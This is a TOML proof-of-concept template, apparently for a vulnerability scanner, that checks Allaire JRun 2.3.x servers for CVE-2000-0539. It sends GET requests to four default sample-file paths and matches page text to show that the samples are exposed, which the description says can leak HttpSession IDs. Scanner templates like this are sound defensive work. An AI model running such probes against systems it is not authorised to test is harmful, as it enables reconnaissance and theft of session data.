[info]
author = "ave"
description = "通过请求 Allaire JRun 2.3.x 自带的示例文件路径，检测目标是否存在敏感信息泄露漏洞。当示例文件未被移除时，攻击者可利用 SessionServlet 获取 HttpSession ID 等敏感信息。"
id = "POC-AVE-2000-0617"
name = "JRun Sample Files Information Disclosure PoC"
severity = "medium"
tags = ["ave-2000-0617"]
vuln_id = [
    "CVE-2000-0539",
    "AVE-2000-0617",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cfanywhere/index.html"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["CFML Sample"]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/docs/servlets/index.html"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["JRun Servlet Engine"]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/jsp/index.html"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["JRun Scripting Examples"]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/webl/index.html"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["What is WebL"]
